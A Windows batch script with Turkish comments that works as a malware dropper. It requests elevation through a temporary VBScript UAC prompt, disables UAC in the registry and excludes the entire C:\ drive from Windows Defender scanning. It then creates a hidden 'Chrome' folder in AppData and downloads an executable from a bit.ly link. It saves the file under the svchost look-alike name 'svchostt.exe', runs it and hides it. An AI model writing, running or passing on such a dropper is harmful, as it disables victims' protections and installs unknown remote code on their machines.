@echo off
cls

REM UAC kontrolü ve yönetici olarak çalıştırma
echo Administrative permissions required. Detecting permissions...
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
REM Eğer hata varsa UAC isteği
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

REM UAC ayarları sadece bir kez yapılmalı
REM UAC ayarları
powershell.exe -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0"

REM Windows Defender istisna ekleme sadece bir kez yapılmalı
REM Windows Defender istisna ekleme
powershell.exe -Command "Add-MpPreference -ExclusionPath 'C:\'"

REM Klasör ve dosya işlemleri sadece bir kez yapılmalı
cd "C:\Users\%USERNAME%\AppData\Local"
mkdir "Chrome"
attrib +h "Chrome" /s /d

cd "C:\Users\%USERNAME%\AppData\Local\Chrome"

REM Dosya indirme ve çalıştırma sadece bir kez yapılmalı
REM Dosya indirme ve çalıştırma
if not exist "svchostt.exe" (
    Powershell -Command "Invoke-Webrequest 'https://bit.ly/temizlebat' -OutFile svchostt.exe"
    start svchostt.exe
    attrib +h "C:\Users\%USERNAME%\AppData\Local\Chrome\svchostt.exe" /s /d
)

exit /B
